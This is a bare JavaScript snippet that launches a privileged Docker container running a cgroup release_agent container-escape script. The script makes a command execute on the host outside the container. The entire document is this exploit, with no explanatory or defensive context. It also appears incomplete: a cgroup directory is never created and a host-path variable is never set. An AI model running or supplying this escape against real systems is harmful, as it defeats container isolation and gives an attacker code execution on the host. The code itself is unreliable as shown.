const escapeScript = `
mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "ps aux > $host_path/output" >> /cmd
echo 1 > /tmp/cgrp/x/cgroup.procs
`;
const dockerArgs = ['run', '--privileged', 'ubuntu:latest', 'bash', '-c', escapeScript];
spawn('docker', dockerArgs);
